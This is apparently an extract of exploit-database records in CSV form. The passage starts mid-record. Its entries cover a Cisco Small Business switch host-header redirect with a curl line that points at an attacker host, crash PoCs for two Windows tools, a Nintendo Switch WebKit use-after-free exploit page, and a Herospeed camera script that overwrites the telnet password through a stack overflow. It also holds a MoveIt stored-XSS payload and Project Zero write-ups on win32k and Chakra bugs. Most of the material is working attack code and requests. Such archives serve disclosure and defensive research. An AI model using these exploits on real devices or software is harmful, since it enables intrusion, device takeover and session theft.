disconnect unless sock.nil?
end
end"
2019-07-15,WebApps,Hardware,Ramikan,CISCO Small Business 200 / 300 / 500 Switches,Multiple Vulnerabilities,"# Exploit Title: CISCO Small Business 200, 300, 500 Switches Multiple Vulnerabilities.
# Shodan query: /config/log_off_page.html
# Discovered Date: 07/03/2014
# Reported Date: 08/04/2019
# Exploit Author: Ramikan
# Website: http://fact-in-hack.blogspot.com
# Vendor Homepage:https://www.cisco.com/c/en/us/products/switches/small-business-300-series-managed-switches/index.html
# Affected Devices:  The affected products are all Cisco Small Business 200, 300, and 500 Series Managed Switches with the web management interface enabled,
# Tested On: Cisco C300 Switch
# Version: 1.3.7.18
# CVE : CVE-2019-1943
# CVSS v3: 4.7 (AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N)
# Category:Hardware, Web Apps
# Reference : https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190717-sbss-redirect","Vulnerability 1: Information Gathering
Unauthenticated user can find the version number and device type by visiting this link directly.
Affected URL:
/cs703dae2c/device/English/dictionaryLogin.xml
Vulnerability 2: Open Redirect due to host header.
Can change to different domain under the host header and redirect the request to fake website and can be used for phishing attack also can be used for domain fronting.
Normal Request
GET / HTTP/1.1
Host: 10.1.1.120
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Normal Response
HTTP/1.1 302 Redirect
Server: GoAhead-Webs
Date: Fri Mar 07 09:40:22 2014
Connection: close
Pragma: no-cache
Cache-Control: no-cache
Content-Type: text/html
Location: https://10.21.151.120/cs703dae2c/
<html><head></head><body>
This document has moved to a new <a href=""https://10.1.1.120/cs703dae2c/"">location</a>.
Please update your documents to reflect the new location.
</body></html>
POC
Host Header changed to different domain (example google.com).
Request:
GET /cs703dae2c HTTP/1.1
Host: google.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: activeLangId=English; isStackableDevice=false
Upgrade-Insecure-Requests: 1
Response:
HTTP/1.1 302 Redirect
activeLangId=English; isStackableDevice=falseServer: GoAhead-Webs
Date: Fri Mar 07 09:45:26 2014
Connection: close
Pragma: no-cache
Cache-Control: no-cache
Content-Type: text/html
Location: http://google.com/cs703dae2c/config/log_off_page.htm
<html><head></head><body>
This document has moved to a new <a href=""http://google.com/cs703dae2c/config/log_off_page.htm"">location</a>.
Please update your documents to reflect the new location.
</body></html>
The redirection is happening to http://google.com/cs703dae2c/config/log_off_page.htm. The attacker need to be in same network and should be able to modify the victims request on the wire in order to trigger this vulnerabilty.
Attack Vector:
Can be used for domain fronting.
curl -k --header ""Host: attack.host.net"" ""domainname of the cisco device""
Vendor Response:
Issue 1:
Due to the limited information given out, we are not considering it a vulnerability as such. Still, it would be better if it was not happening, so, we will treat it as a hardening enhancement.
Issue 2:
The developers won't be able to provide a fix for this in the short term (90 days), so, we are planning to disclose this issue through an advisory on July 17th 2019.
We have assigned CVE CVE-2019-1943 for this issue.
Reference: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190717-sbss-redirect"
2019-02-15,DoS,Windows,Victor Mondragón,Free IP Switcher 3.1,'Computer Name' Denial of Service (PoC),"#Exploit Title: Free IP Switcher 3.1 - Denial of Service (PoC)
#Discovery by: Victor Mondragón
#Discovery Date: 2018-02-14
#Vendor Homepage: http://www.eusing.com/index.html
#Software Link: http://www.eusing.com/ipscan/free_ip_scanner.htm
#Tested Version: 3.1
#Tested on: Windows 10 Single Language x64 / Windows 7 x32 Service Pack 1
#Steps to produce the crash:
#1.- Run python code: Free_IP_Switcher_3.1.py
#2.- Open bd.txt and copy content to clipboard
#2.- Open Free IP Switcher
#3.- Select ""Network Adapter""
#4.- In ""Additional"" enable ""Computer Name"" and Paste ClipBoard
#5.- Click on ""Activate""
#6.- Crashed","cod = ""\x41"" * 240
f = open('ip_code.txt', 'w')
f.write(cod)
f.close()"
2018-08-13,DoS,Windows_x86,Shubham Singh,Switch Port Mapping Tool 2.81.2,'Name Field' Denial of Service (PoC),"# Exploit Title: Switch Port Mapping Tool 2.81.2 - 'Name Field' Denial of Service (PoC)
# Discovery by: Shubham Singh
# Known As: Spirited Wolf [Twitter: @Pwsecspirit]
# Discovey Date: 2018-08-13
# Vendor Homepage: https://switchportmapper.com/
# Software Link: https://switchportmapper.com/download/spm2812.zip
# Tested Version: 2.81.2
# Tested on OS: Windows 7 Ultimate x86_64
# Steps to Reproduce:
# Run the python exploit script, it will create a new file with the name
# ""exploit.txt"". Just copy the text inside ""exploit.txt"" and start the
# Managed Switch Port Mapping Tool 2.81.2 program and click on ""Enter Key"".
# In the 'Name field' paste the content of ""exploit.txt"" and click
# on ""OK"". You will see a crash.
#!/usr/bin/env python","file = open(""exploit.txt"",""wb"")
junk = ""A"" * 3000
exploit = junk
buf = exploit
file.write(buf)
file.close()"
2018-07-31,DoS,Windows,Luis Martínez,Switch Port Mapping Tool 2.81,'SNMP Community Name' Denial of Service (PoC),"# Exploit Title: Switch Port Mapping Tool 2.81 - 'SNMP Community Name' Denial of Service (PoC)
# Discovery by: Luis Martinez
# Discovery Date: 2018-07-27
# Vendor Homepage: https://switchportmapper.com/
# Software Link : http://download.switchportmapper.com/spm281.zip
# Tested Version: 2.81
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: Windows 10 Pro x64 es
# Steps to Produce the Crash:
# 1.- Run python code : python Managed_Switch_Port_Mapping_Tool_2.81.py
# 2.- Open Managed_Switch_Port_Mapping_Tool_2.81.txt and copy content to clipboard
# 3.- Open spmap.exe
# 4.- Switch Group > Settings
# 6.- Paste ClipBoard on ""SNMP v1/v2c Read Community Name""
# 7.- OK
# 8.- Crashed
#!/usr/bin/env python","buffer = ""\x41"" * 564
f = open (""Managed_Switch_Port_Mapping_Tool_2.81.txt"", ""w"")
f.write(buffer)
f.close()"
2017-03-12,DoS,Hardware,qwertyoruiop,Nintendo Switch,WebKit Code Execution (PoC),"// display JS errors as alerts. Helps debugging.
// based on jbme.qwertyoruiop.com
// Thanks to:
//  + qwertyoruiop
//  + Retr0id
//  + Ando
// saelo\'s phrack article is invaluable: http://www.phrack.org/papers/attacking_javascript_engines.html
// garbage collection stuff
// do garbage collect
// access to the overlapping Uint32Array
// we will modify the vector of this
// the array with the stale pointer
// write 2x 32bit in a DataView and get the Float representation of it
// check if the length of the array smash changed already. if yes, bail out.
// garbage collect
// new array with 0x100 elements
// new array buffer of length 0x1000
// populate the arr with pointer to yolo and a number. not quite sure why.
// create an object whos toString function returns number 10 and messes with arr.
// if bufs is already overlapping memory, bail out.
// really make sure garbage is collected
// the array pointed at by arr should be gone now.
// for the whole buf Array
// fill it with a lot of Uint32Arrays, hopefully allocated where arr was earlier
// for each element of that array
// set memory to 0x41414141 0xffff0000
// basically spraying the JSValue 0xffff000041414141
// which is the Integer 0x41414141
// phrack: Integer FFFF:0000:IIII:IIII
// define a new object with some properties
// the length of this object is set to this object that does evil stuff with toString()
// the reference to the arr array. Which will later be freed.
// define a new target array
// TRIGGER BUG!
// set the properties of the target based on the previously defined ones
// get a reference to the target stale property, which points to arr
// make sure that the stale[0] points actually to the 0x41414141 data if not, we don\'t wanna mess with it and try again
// stale[0] is now pointing at a fake Integer 0x41414141. Now make it 0x41414242
//stale[0] = 0x41414242;
//document.getElementById(\'status\').innerText = \'bug done.\';
// searching the whole memory that is overlaying the old arr. Looking for 0x41414242
// Found the value! bufs[i][k] point now at the same memory as stale[0]
// create a new object. Will look kinda like this:
// 0x0100150000000136 0x0000000000000000 <- fictional value
// 0x0000000000000064 0x0000000000000000 <- [\'a\'],[\'b\']
// 0x???????????????? 0x0000000000000100 <- [\'c\'],[\'d\']
// remember the original stale pointer, pointing at the object with the a,b,c,d properties
// now add 0x10 to the pointer of stale[0], which points now in the middle of the object.
// check the type of stale[0].
// removed the loop because it makes the exploit sooooooo unreliable
// based on phrack paper - Predicting structure IDs (http://www.phrack.org/papers/attacking_javascript_engines.html)
/*while(!(stale[0] instanceof Uint32Array)) {
// if stale[0] is not a Uint32Array yet, increment the structureID guess
// assign the next structureID to the original object still referenced by stale[1]
// Give some information. stale[0] should now be a Uint32Array
// write to the 6th 32bit value of the memory pointed to by the crafted Uint32Array
// which should point to the struct of smash, allowing us to overwrite the length of smash
// check the length of smash is now.
// if Switch browser is detected, auto start exploit","<!doctype html>
<html>
<head>
<title>CVE-2016-4657 Switch PoC</title>
<style>
body {font-size: 2em;}
a {text-decoration: none; color: #000;}
a:hover {color: #f00; font-weight: bold;}
</style>
</head>
<body>
<h1>CVE-2016-4657 Nintendo Switch PoC</h1>
<ul>
<li><a href=\'javascript:go();\'> go!</a></li>
<li><a href=\'javascript:document.location.reload();\'> reload</a></li>
</ul>
<div id=\'status\'> waiting... click go.</div>
<script>
window.onerror = function(error, url, line) {
alert(error+\' URL:\'+url+\' L:\'+line);
</script>
<script>
var pressure = new Array(100);
dgc = function() {
for (var i = 0; i < pressure.length; i++) {
pressure[i] = new Uint32Array(0x10000);
for (var i = 0; i < pressure.length; i++) {
pressure[i] = 0;
var bufs = new Array(0x1000);
var smash = new Uint32Array(0x10);
var stale = 0;
var _dview = null;
function u2d(low, hi) {
if (!_dview) _dview = new DataView(new ArrayBuffer(16));
_dview.setUint32(0, hi);
_dview.setUint32(4, low);
return _dview.getFloat64(0);
function go_() {
if (smash.length != 0x10) return;
dgc();
var arr = new Array(0x100);
var yolo = new ArrayBuffer(0x1000);
arr[0] = yolo;
arr[1] = 0x13371337;
var not_number = {};
not_number.toString = function() {
arr = null;
props[\""stale\""][\""value\""] = null;
if (bufs[0]) return 10;
for (var i = 0; i < 20; i++) {
dgc();
for (i = 0; i < bufs.length; i++) {
bufs[i] = new Uint32Array(0x100 * 2)
for (k = 0; k < bufs[i].length;) {
bufs[i][k++] = 0x41414141;
bufs[i][k++] = 0xffff0000;
return 10;
var props = {
p0: { value: 0 },
p1: { value: 1 },
p2: { value: 2 },
p3: { value: 3 },
p4: { value: 4 },
p5: { value: 5 },
p6: { value: 6 },
p7: { value: 7 },
p8: { value: 8 },
length: { value: not_number },
stale: { value: arr },
after: { value: 666 }
var target = [];
Object.defineProperties(target, props);
stale = target.stale;
if(stale[0]==0x41414141) {
stale[0] += 0x101;
for (i = 0; i < bufs.length; i++) {
for (k = 0; k < bufs[0].length; k++) {
if (bufs[i][k] == 0x41414242) {
alert(\'Overlapping Arrays found at bufs[\'+i+\'][\'+k+\']\\nsmash.length is still: 0x\'+smash.length.toString(16));
stale[0] = {
\'a\': u2d(105, 0), // the JSObject properties ; 105 is the Structure ID of Uint32Array
\'b\': u2d(0, 0),
\'c\': smash, // var pointing at the struct of a Uint32Array(0x10)
\'d\': u2d(0x100, 0)
alert(\'created the JSObject.\\nstale[0] = \'+stale[0]);
stale[1] = stale[0];
bufs[i][k] += 0x10;
structureID++;
stale[1][\'a\'] = u2d(structureID, 0);
alert(\'misaligned the pointer to the JSObject.\\nstale[0] = \'+stale[0]+\'\');
stale[0][6] = 0x1337;
alert(\'smash.length is now: 0x\'+smash.length.toString(16));
alert(\'done!\\nswitch will probably crash now :O\');
return;
document.getElementById(\'status\').innerText = \' fail. refresh the page and try again...\';
setTimeout(function() {document.location.reload();}, 1000);
function go() {
document.getElementById(\'status\').innerText = \' go! \';
dgc();
dgc();
dgc();
dgc();
dgc();
dgc();
setTimeout(go_, 500);
if(navigator.userAgent.indexOf(\'Nintendo Switch\')>-1) {
document.getElementById(\'status\').innerText = \'Found Nintendo Switch! \';
setTimeout(go, 2000);
</script>
</body>
</html>"
2018-01-22,Remote,Hardware,bashis,Herospeed,'TelnetSwitch' Remote Stack Overflow / Overwrite Password / Enable TelnetD,"#!/usr/bin/env python2.7
# Herospeed TelnetSwitch daemon running on TCP/787, for allowing enable of the telnetd.
# Where one small stack overflow allows us to overwrite the dynamicly generated password and enable telnetd.
# [Verified]
# 1) Fullhan IPC FH8830_F22_W_7.1.42.1
# 2) Fullhan FH8830_AR0330_FISHEYE_W_7.1.37.5
# 3) HiSilicon 3518EV200_OV9732_W_7.1.25.1, 3519V100_IMX274_W_7.1.39.3
# 4) Ambarella s2l55m_imx123_W_7.1.25.2, S2E66_IMX178_W_7.1.3.4
# Author: bashis <mcw noemail eu>, 2018
# Validate correctness of HOST, IP and PORT
# Check if IP is valid
# Check if PORT is valid
# Check if HOST is valid
# Check valid IP
# Now we check if it is correct typed IP
# Else check valid DNS name, and use the IP address
# Check if RPORT is valid
# Check if RHOST is valid IP or FQDN, get IP back
# [Payload]
# Fullhan IPC FH8830_F22_W_7.1.42.1
# Fullhan FH8830_AR0330_FISHEYE_W_7.1.37.5
# HiSilicon 3518EV200_OV9732_W_7.1.25.1
#PASSWD = ""AAAAAAAAAAAA""# Our new password, must be exactly 12 char, and must be 'A'
#MESSAGE =  ''+ LOGIN + ':' + PASSWD +''
#BASE64_NULL = ""A"" * 364 # Decoded as 0x00 with base64 decode
#HEAP_PWD = 0x00016990 # Start of the dynamicly generated password, located on heap
# HiSilicon 3519V100_IMX274_W_7.1.39.3
#PASSWD = ""AAAAAAAAAAAA""# Our new password, must be exactly 12 char, and must be 'A'
#MESSAGE =  ''+ LOGIN + ':' + PASSWD +''
#BASE64_NULL = ""A"" * 364 # Decoded as 0x00 with base64 decode
#HEAP_PWD = 0x000267b0 # Start of the dynamicly generated password, located on heap
# Ambarella s2l55m_imx123_W_7.1.25.2
#PASSWD = ""AAAAAAAAAAAA""# Our new password, must be exactly 12 char, and must be 'A'
#MESSAGE =  ''+ LOGIN + ':' + PASSWD +''
#BASE64_NULL = ""A"" * 364 # Decoded as 0x00 with base64 decode
#HEAP_PWD = 0x00014c3c # Start of the dynamicly generated password, located on heap
# Ambarella S2E66_IMX178_W_7.1.3.4
#PASSWD = ""AAAAAAAAAAAA""# Our new password, must be exactly 12 char, and must be 'A'
#MESSAGE =  ''+ LOGIN + ':' + PASSWD +''
#BASE64_NULL = ""A"" * 108 # Decoded as 0x00 with base64 decode
#HEAP_PWD = 0x00014c68 # Start of the dynamicly generated password, located on heap
# Since the stack overflow writing with only one byte, we need overwrite the password one char at the time (looping twelve times)","import socket
import select
import sys
import argparse
import base64
import struct
import time
class Validate:
def __init__(self,verbose):
self.verbose = verbose
def CheckIP(self,IP):
self.IP = IP
ip = self.IP.split('.')
if len(ip) != 4:
return False
for tmp in ip:
if not tmp.isdigit():
return False
i = int(tmp)
if i < 0 or i > 255:
return False
return True
def Port(self,PORT):
self.PORT = PORT
if int(self.PORT) < 1 or int(self.PORT) > 65535:
return False
else:
return True
def Host(self,HOST):
self.HOST = HOST
try:
socket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP
if self.CheckIP(self.HOST):
return self.HOST
else:
return False
except socket.error as e:
try:
self.HOST = socket.gethostbyname(self.HOST)
return self.HOST
except socket.error as e:
return False
if __name__ == ""__main__"":
INFO =  '\n[Herospeed TelnetSwitch pwn (2018 bashis <mcw noemail eu>)]\n'
rhost = '192.168.57.20'# Default Remote HOST
rport = 787# Default Remote PORT
BUFFER_SIZE = 1024
try:
arg_parser = argparse.ArgumentParser(
prog=sys.argv[0],
description=('[*] '+ INFO +' [*]'))
arg_parser.add_argument('--rhost', required=True, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ str(rport) +']')
args = arg_parser.parse_args()
except Exception as e:
print INFO,""\nError: {}\n"".format(str(e))
sys.exit(1)
print INFO
if args.rport:
rport = int(args.rport)
if args.rhost:
rhost = args.rhost
IP = args.rhost
if not Validate(True).Port(rport):
print ""[!] Invalid RPORT - Choose between 1 and 65535""
sys.exit(1)
rhost = Validate(True).Host(rhost)
if not rhost:
print ""[!] Invalid RHOST""
sys.exit(1)
timeout = 5
socket.setdefaulttimeout(timeout)
LOGIN = ""Lucky787""# Hardcoded login
PASSWD = ""\n\n\n\n\n\n\n\n\n\n\n\n""# Our new password, must be exactly 12 char, and must be '\n'
MESSAGE =  ''+ LOGIN + ':' + PASSWD +''
BASE64_NULL = ""A"" * 232 # Decoded as 0x00 with base64 decode
HEAP_PWD = 0x00016c8c # Start of the dynamicly generated password, located on heap
MESSAGE = base64.b64encode(bytes(MESSAGE))
MESSAGE += BASE64_NULL
for where in range(0, len(PASSWD)):
OUT = ""GET / HTTP/1.0\nAuthorization: Basic {}{}\n\n"".format(MESSAGE,struct.pack('<L',HEAP_PWD)[:3])
print ""Writing to: {}"".format(hex(HEAP_PWD))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost, rport))
s.send(OUT)
time.sleep(0.5)
response = s.recv(BUFFER_SIZE).split()
HEAP_PWD += 0x1 # Next address on heap
if response[1]:
if response[1] == ""200"":
print ""({}) OK, telnetd should be open!"".format(response[1])
break"
2018-02-02,WebApps,ASPX,1n3,IPSwitch MOVEit 8.1 < 9.4,Cross-Site Scripting,"# Exploit Title: IPSwitch MoveIt Stored Cross Site Scripting (XSS)
# Date: 1-31-2017
# Software Link: https://www.ipswitch.com/moveit
# Affected Version: 8.1-9.4 (only confirmed on 8.1 but other versions prior to 9.5 may also be vulnerable)
# Exploit Author: 1N3@CrowdShield - https://crowdshield.com (Early Warning Security)
# Contact: https://twitter.com/crowdshield
# Vendor Homepage: https://www.ipswitch.com
# Category: Webapps
# Attack Type: Remote
# Impact: Data/Cookie Theft","1. Description
IPSwitch MoveIt v8.1 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. Attackers can leverage this vulnerability to send malicious messages to other users in order to steal session cookies and launch client-side attacks.
2. Proof of Concept
The vulnerability lies in the Send Message -> Body Text Area input field.
POST /human.aspx?r=692492538 HTTP/1.1
Host: host.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: https://host.com/human.aspx?r=510324925
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 598
czf=9c9e7b2a9c9e7b2a9c9e7b2a9c9e7b2a9c066e4aee81bf97f581826d8c093953d82d2b692be5490ece13e6b23f1ad09bda751db1444981eb029d2427175f9906&server=host.com&url=%2Fhuman.aspx&instid=2784&customwizlogoenabled=0&customwiznameup=&customwizzipnameup=%5Bdefault%5D&transaction=secmsgpost&csrftoken=1a9cc0f7aa7ee2d9e0059d6b01da48b69a14669d&curuser=kuxt36r50uhg0sXX&arg12=secmsgcompose&Arg02=&Arg03=452565093&Arg05=edit&Arg07=forward&Arg09=&Arg10=&opt06=&Opt08=&opt01=username&opt02=&opt03=&arg01=FW%3A+test&Opt12=1&arg04=<iframe/src=javascript:alert(1)>&attachment=&opt07=1&arg05_Send=Send
3. Solution:
Update to version 9.5
4. Disclosure Timeline
1/30/2017 - Disclosed details of vulnerability to IPSwitch.
1/31/2017 - IPSwitch confirmed the vulnerability and verified the fix as of version 9.5 and approved public disclosure of the vulnerability."
2018-01-05,DoS,Windows,Google Security Research,Microsoft Windows win32k,Using SetClassLong to Switch Between CS_CLASSDC and CS_OWNDC Corrupts DC Cache,"Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1389&desc=6
https://blogs.msdn.microsoft.com/oldnewthing/20060601-06/?p=31003
https://blogs.msdn.microsoft.com/oldnewthing/20060602-00/?p=30993
#include <windows.h>
#pragma comment(lib, ""user32"")
# ChildEBP RetAddr  Args to Child
# Make $t0 gpDispInfo->pdceFirst
# Now dump the whole list:
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/43446.zip","Windows maintains a DC cache in win32kbase!gpDispInfo->pdceFirst. If you create multiple windows from a shared class while switching between CS_OWNDC and CS_CLASSDC, you can cause cache list entries to maintain references to free WND structures.
There are two interesting background posts on CS_OWNDC and CS_CLASSDC here:
Here is a minimal testcase:
$ cat dccache.c
int main(int argc, char **argv) {
WNDCLASSEX WindowClass = {0};
HWND WindowA, WindowB, WindowC;
ATOM Atom;
WindowClass.cbSize         = sizeof(WNDCLASSEX);
WindowClass.lpfnWndProc    = DefWindowProc;
WindowClass.lpszClassName  = ""Class"";
Atom = RegisterClassEx(&WindowClass);
WindowA = CreateWindowEx(0, MAKEINTATOM(Atom), ""One"", 0, CW_USEDEFAULT, 0, 128, 128, NULL, NULL, NULL, NULL);
SetClassLong(WindowA, GCL_STYLE, CS_CLASSDC);
WindowB = CreateWindowEx(0, MAKEINTATOM(Atom), ""Two"", 0, CW_USEDEFAULT, 0, 128, 128, NULL, NULL, NULL, NULL);
GetDC(WindowA);
SetClassLong(WindowA, GCL_STYLE, CS_CLASSDC | CS_OWNDC);
WindowC = CreateWindowEx(0, MAKEINTATOM(Atom), ""Three"", 0, CW_USEDEFAULT, 0, 128, 128, NULL, NULL, NULL, NULL);
return 0;
This might take a while to crash though, something has to cause the list to be traversed (e.g. a new window opens) after the freed memory has changed. It can also crash in some very strange places. We can speed the process up by trying to get the allocation ourselves.
First I need to know the size of a WND structure. If you look at the call to HMAllocObject() in win32kfull!xxxCreateWindowEx, you can see it's 240 bytes:
.text:00081BCC _xxxCreateWindowEx@68 proc near
.text:00081EE2 push    240             ; _DWORD
.text:00081EE7 push    1               ; _DWORD
.text:00081EE9 push    [ebp+var_12C]   ; _DWORD
.text:00081EEF push    ebx             ; _DWORD
.text:00081EF0 call    ds:__imp__HMAllocObject@16 ; HMAllocObject(x,x,x,x)
A well-known trick to get arbitrary sized allocations from the desktop heap is to use SetWindowText(), you just create a WCHAR string of the required length - good enough for testing.
e.g. SetWindowTextW(Window, L""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."");
So my plan is to create a thread to trigger the free, and then try to steal the allocation. See the testcase attached for my code.
This reliably crashes Windows 10 with version 10.0.15063.674, the crash looks like this:
eax=00410041 ebx=00000010 ecx=95423580 edx=95423580 esi=99464440 edi=954004d0
eip=93fb40d8 esp=9dba78f0 ebp=9dba7910 iopl=0         nv up ei pl nz na pe cy
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010207
win32kfull!zzzLockDisplayAreaAndInvalidateDCCache+0xba:
93fb40d8 8b403c          mov     eax,dword ptr [eax+3Ch] ds:0023:0041007d=????????
0: kd> kv
00 9dba7910 93fb2722 00000000 0c6775a3 9dba7b80 win32kfull!zzzLockDisplayAreaAndInvalidateDCCache+0xba (FPO: [Non-Fpo])
01 9dba7afc 93fd1916 0000c1ac 9dba7b74 00000000 win32kfull!xxxCreateWindowEx+0xb56 (FPO: [Non-Fpo])
02 9dba7bc8 81d97397 80000000 0000c1ac 0000c1ac win32kfull!NtUserCreateWindowEx+0x2b0 (FPO: [Non-Fpo])
03 9dba7bc8 77104350 80000000 0000c1ac 0000c1ac nt!KiSystemServicePostCall (FPO: [0,3] TrapFrame @ 9dba7c14)
04 0073f0b8 7497485a 74bae418 80000000 0000c1ac ntdll!KiFastSystemCallRet (FPO: [0,0,0])
05 0073f0bc 74bae418 80000000 0000c1ac 0000c1ac win32u!NtUserCreateWindowEx+0xa (FPO: [17,0,0])
06 0073f394 74badcff 0073f3e0 00000000 80000000 USER32!VerNtUserCreateWindowEx+0x22b (FPO: [Non-Fpo])
07 0073f468 74baeaf8 00cc1010 00000000 80000000 USER32!CreateWindowInternal+0x153 (FPO: [Non-Fpo])
08 0073f4a8 00cb1173 00000000 0000c1ac 00cc1010 USER32!CreateWindowExA+0x38 (FPO: [Non-Fpo])
So let's dump the DC Cache and see what it looks like, an entry looks something like:
typedef struct _DCE {
PDCE    pdceNext;
HANDLE  hDC;
PWND    pwndOrg;
PWND    pwndClip;
} DCE, *PDCE;
0: kd> r $t0=poi(poi(win32kbase!gpDispInfo)+8)
0: kd> .while (@$t0) { .printf ""dce %p ->pwndOrg %p\n"",@$t0,poi(@$t0+8); r @$t0=poi(@$t0) }
dce 99464440 ->pwndOrg 95423580
dce 922140e8 ->pwndOrg 00000000
dce 9239d638 ->pwndOrg 00000000
dce 9239beb0 ->pwndOrg 00000000
dce 99510540 ->pwndOrg 9541ede8
dce 92274178 ->pwndOrg 954004d0
dce 9223d2b0 ->pwndOrg 954004d0
dce 922050e8 ->pwndOrg 945504d0
So my theory is that one of these WND pointers is actually a bad reference, and
look at this:
0: kd> du 95423580
95423580  ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""
954235c0  ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""
95423600  ""AAAAAAAAAAA""
There is the text I set via SetWindowText().
(The testcase I sent Microsoft triggered a couple of other BSOD I want fixed as well. I'm hoping whoever gets assigned this bug will just fix them, they're dead easy oneline fixes).
Proof of Concept:"
2017-11-16,DoS,Windows,Google Security Research,Microsoft Edge Chakra JIT,Type Confusion with switch Statements,Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1341&desc=3,"Let's start with a switch statement and its IR code for JIT.
JS:
for (let i = 0; i <; 100; i++) {
switch (i) {
case 2:
case 4:
case 6:
case 8:
case 10:
case 12:
case 14:
case 16:
case 18:
case 20:
case 22:
case 24:
case 26:
case 28:
case 30:
case 32:
case 34:
case 36:
case 38:
break;
IRs before Type Specialization:
s26.var         =  Ld_A           s24.var - ""i""                           #0011  Bailout: #0011 (BailOutExpectingInteger)
BrLt_A         $L2, s26.var, s5.var                    #0070
$L9:                                                                          #0070
BrGt_A         $L2, s26.var, s23.var                   #0070
$L8:                                                                          #0070
s28.var         =  Sub_A          s26.var, 2 (0x2).i32                    #0070  // Because of the minimum case is 2, subtracting 2 from i. s28 is a temporary variable.
MultiBr        ..., s28.var #0070
IRs after Type Specialization:
s52(s26).i32    =  Ld_A           s51(s24).i32 - ""i""                      #0011
BrLt_I4        $L2, s51(s24).i32, 2 (0x2).i32          #0070
$L9:                                                                          #0070
BrGt_I4        $L2, s51(s24).i32, 38 (0x26).i32        #0070
$L8:                                                                          #0070
s53(s28).i32    =  Sub_I4         s51(s24).i32, 2 (0x2).i32               #0070
MultiBr        ..., s53(s28).i32! #0070
MultiBr instructions' offset operand(s28 in the above) must be of type Int32. If not, type confusion will occur. The way to ensure it is to use BailOutExpectingInteger.
In the above code, ""s26"" is ensured to be of type Int32 by the bailout. So, the other variables affected by ""s26"" including the offset variable ""s28"" are also ensured to be of type Int32.
What I noticed is ""s28.var = Sub_A s26.var, 2 (0x2).i32"". If we declare a variable ""j"" with ""i - 2"", the offset variable ""s28"" will be replaced with ""j"" in the CSE phase.
JS:
for (let i = 0; i < 100; i++) {
let j = i - 2;
switch (i) {
case 2:
case 4:
case 6:
case 8:
case 10:
case 12:
case 14:
case 16:
case 18:
case 20:
case 22:
case 24:
case 26:
case 28:
case 30:
case 32:
case 34:
case 36:
case 38:
break;
IR:
Line   3: let j = i - 2;
Col    9: ^
StatementBoundary  #2                                  #0013
s55(s28).i32    =  Sub_I4         s54(s24).i32, 2 (0x2).i32               #0013
Line   4: switch (i) {
Col    9: ^
StatementBoundary  #3                                  #001a  // BailOutExpectingInteger
BrLt_I4        $L2, s54(s24).i32, 2 (0x2).i32          #0079
BrGt_I4        $L2, s54(s24).i32, 38 (0x26).i32        #0079
MultiBr        ..., s55(s28).i32! #0079
The offset variable is replaced with ""j"" that is not ensured to be of type Int32.
CORRECTION: The bug was that it tried to ensure the type using BailOutExpectingInteger, even if ""i"" was not always of type Int32. It was bypassed with the CSE phase. So if we created a case where ""j"" couldn't be of type Int32, type confusion occurred.
JS:
for (let i = 0; i < 100; i++) {
let j = i - 2;
switch (i) {
case 2:
case 4:
case 6:
case 8:
case 10:
case 12:
case 14:
case 16:
case 18:
case 20:
case 22:
case 24:
case 26:
case 28:
case 30:
case 32:
case 34:
case 36:
case 38:
break;
if (i == 39)
i = 'aaaa';
IR:
Line   3: let j = i - 2;
Col    9: ^
StatementBoundary  #2                                  #0013
s30[LikelyCanBeTaggedValue_Int].var = Sub_A  s26[LikelyCanBeTaggedValue_Int_Number].var, 0x1000000000002.var #0013
s27[LikelyCanBeTaggedValue_Int].var = Ld_A  s30[isTempLastUse][LikelyCanBeTaggedValue_Int].var! #0017
Line   4: switch (i) {
Col    9: ^
StatementBoundary  #3                                  #001a
s63(s26).i32    =  FromVar        s26[LikelyCanBeTaggedValue_Int_Number].var #001a  Bailout: #001a (BailOutExpectingInteger)
BrLt_I4        $L4, s63(s26).i32, 2 (0x2).i32          #0079
BrGt_I4        $L4, s63(s26).i32, 38 (0x26).i32        #0079
MultiBr        ..., s27[LikelyCanBeTaggedValue_Int].var #0079
It ended up to use ""j"" of type Var as the offset variable.
PoC:
function opt() {
for (let i = 0; i < 100; i++) {
let j = i - 2;
switch (i) {
case 2:
case 4:
case 6:
case 8:
case 10:
case 12:
case 14:
case 16:
case 18:
case 20:
case 22:
case 24:
case 26:
case 28:
case 30:
case 32:
case 34:
case 36:
case 38:
break;
if (i == 90) {
i = 'x';
function main() {
for (let i = 0; i < 100; i++) {
opt();
main();
Crash Log:
RAX: 0x1
RBX: 0x7ffff7e04824 --> 0x100000000
RCX: 0x3
RDX: 0x7ffff0b20667 (loope  0x7ffff0b2066d)
RSI: 0x80000001
